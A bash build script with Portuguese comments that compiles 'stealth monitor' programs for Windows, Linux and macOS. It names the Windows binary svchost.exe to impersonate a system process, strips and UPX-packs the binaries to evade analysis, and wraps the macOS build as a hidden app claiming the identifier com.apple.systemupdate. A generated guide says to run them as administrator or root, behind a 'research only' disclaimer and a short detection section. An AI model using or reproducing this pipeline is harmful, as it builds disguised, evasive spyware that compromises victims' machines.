#!/bin/bash

echo "üöÄ COMPILANDO PROJETO CIENT√çFICO MULTI-PLATAFORMA"
echo "=================================================="

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Fun√ß√£o para compilar Windows (cross-compile)
build_windows() {
    echo -e "${BLUE}[WINDOWS]${NC} Compilando monitor stealth..."
    
    if command -v x86_64-w64-mingw32-gcc &> /dev/null; then
        cd ../windows
        x86_64-w64-mingw32-gcc -O3 -s -mwindows -static \
            -o svchost.exe win_stealth_monitor.c \
            -luser32 -lkernel32 -ladvapi32 -lpsapi -lws2_32 \
            -Wl,--strip-all,--no-insert-timestamp
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}‚úì Windows build successful: svchost.exe${NC}"
            
            # Aplicar packer se dispon√≠vel
            if command -v upx &> /dev/null; then
                upx --ultra-brute svchost.exe 2>/dev/null
                echo -e "${GREEN}‚úì Binary packed with UPX${NC}"
            fi
        else
            echo -e "${RED}‚úó Windows build failed${NC}"
        fi
        cd ../build
    else
        echo -e "${YELLOW}‚ö† MinGW not found, skipping Windows build${NC}"
    fi
}

# Fun√ß√£o para compilar Linux
build_linux() {
    echo -e "${BLUE}[LINUX]${NC} Compilando monitor stealth..."
    
    cd ../linux
    gcc -O3 -s -o system-monitor linux_stealth_monitor.c \
        -lX11 -lXext -lpthread \
        -Wl,--strip-all
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}‚úì Linux build successful: system-monitor${NC}"
        
        # Aplicar packer se dispon√≠vel
        if command -v upx &> /dev/null; then
            upx --ultra-brute system-monitor 2>/dev/null
            echo -e "${GREEN}‚úì Binary packed with UPX${NC}"
        fi
        
        # Tornar execut√°vel
        chmod +x system-monitor
    else
        echo -e "${RED}‚úó Linux build failed${NC}"
        echo -e "${YELLOW}Tentando build sem static linking...${NC}"
        
        gcc -O3 -s -o system-monitor linux_stealth_monitor.c \
            -lX11 -lXext -lpthread
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}‚úì Linux build successful (dynamic): system-monitor${NC}"
            chmod +x system-monitor
        fi
    fi
    cd ../build
}

# Fun√ß√£o para compilar macOS
build_macos() {
    echo -e "${BLUE}[MACOS]${NC} Compilando monitor stealth..."
    
    if [[ "$OSTYPE" == "darwin"* ]]; then
        cd ../macos
        clang -O3 -framework CoreFoundation -framework CoreGraphics \
              -framework ApplicationServices -framework Carbon \
              -o SystemUpdate macos_stealth_monitor.c
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}‚úì macOS build successful: SystemUpdate${NC}"
            chmod +x SystemUpdate
            
            # Criar bundle se necess√°rio
            if [ ! -d "SystemUpdate.app" ]; then
                mkdir -p SystemUpdate.app/Contents/MacOS
                mv SystemUpdate SystemUpdate.app/Contents/MacOS/
                
                cat > SystemUpdate.app/Contents/Info.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>SystemUpdate</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.systemupdate</string>
    <key>CFBundleName</key>
    <string>System Update</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>LSUIElement</key>
    <true/>
</dict>
</plist>
EOF
                echo -e "${GREEN}‚úì macOS app bundle created${NC}"
            fi
        else
            echo -e "${RED}‚úó macOS build failed${NC}"
        fi
        cd ../build
    else
        echo -e "${YELLOW}‚ö† Not running on macOS, skipping macOS build${NC}"
    fi
}

# Fun√ß√£o para criar documenta√ß√£o
create_docs() {
    echo -e "${BLUE}[DOCS]${NC} Gerando documenta√ß√£o cient√≠fica..."
    
    cd ../research
    
    cat > usage_guide.md << 'EOF'
# üéì Guia de Uso Cient√≠fico

## ‚ö†Ô∏è AVISO LEGAL
Este projeto √© destinado EXCLUSIVAMENTE para:
- Pesquisa acad√™mica em seguran√ßa cibern√©tica
- Treinamento de Blue Team e Red Team
- An√°lise de comportamento de sistemas
- Desenvolvimento de contramedidas

**N√ÉO USE PARA ATIVIDADES ILEGAIS!**

## Uso por Plataforma

### Windows
```bash
# Executar como administrador
svchost.exe

# Verificar execu√ß√£o
tasklist | findstr svchost
```

### Linux
```bash
# Executar como root (recomendado)
sudo ./system-monitor

# Verificar execu√ß√£o
ps aux | grep system-monitor
```

### macOS
```bash
# Executar (requer permiss√µes de acessibilidade)
./SystemUpdate.app/Contents/MacOS/SystemUpdate

# Verificar execu√ß√£o
ps aux | grep SystemUpdate
```

## Detec√ß√£o (Blue Team)

### Indicadores de Compromisso
- Processos com nomes gen√©ricos do sistema
- Conex√µes DNS suspeitas para dom√≠nios n√£o conhecidos
- Hooks de baixo n√≠vel em APIs cr√≠ticas
- Arquivos tempor√°rios com padr√µes espec√≠ficos

### Ferramentas de Detec√ß√£o
- Process Monitor (Windows)
- Wireshark para an√°lise de tr√°fego
- Volatility para an√°lise de mem√≥ria
- YARA rules para detec√ß√£o de padr√µes

## Contramedidas

### Preven√ß√£o
- Monitoramento de APIs sens√≠veis
- Whitelist de processos autorizados
- An√°lise comportamental
- Sandboxing de aplica√ß√µes

### Detec√ß√£o
- EDR (Endpoint Detection and Response)
- SIEM com regras espec√≠ficas
- Honeypots para capturar atividade
- Machine Learning para detec√ß√£o de anomalias
EOF

    echo -e "${GREEN}‚úì Documenta√ß√£o criada${NC}"
    cd ../build
}

# Fun√ß√£o principal
main() {
    echo -e "${YELLOW}Iniciando compila√ß√£o multi-plataforma...${NC}"
    echo ""
    
    # Verificar depend√™ncias
    echo -e "${BLUE}[DEPS]${NC} Verificando depend√™ncias..."
    
    # Verificar compiladores
    if command -v gcc &> /dev/null; then
        echo -e "${GREEN}‚úì GCC encontrado${NC}"
    else
        echo -e "${RED}‚úó GCC n√£o encontrado${NC}"
    fi
    
    if command -v clang &> /dev/null; then
        echo -e "${GREEN}‚úì Clang encontrado${NC}"
    else
        echo -e "${YELLOW}‚ö† Clang n√£o encontrado${NC}"
    fi
    
    echo ""
    
    # Compilar para cada plataforma
    build_linux
    echo ""
    build_windows
    echo ""
    build_macos
    echo ""
    create_docs
    
    echo ""
    echo -e "${GREEN}üéâ COMPILA√á√ÉO CONCLU√çDA!${NC}"
    echo -e "${YELLOW}üìö Leia research/usage_guide.md antes de usar${NC}"
    echo -e "${RED}‚ö†Ô∏è  Use apenas para fins educacionais e legais!${NC}"
}

# Executar fun√ß√£o principal
main "$@"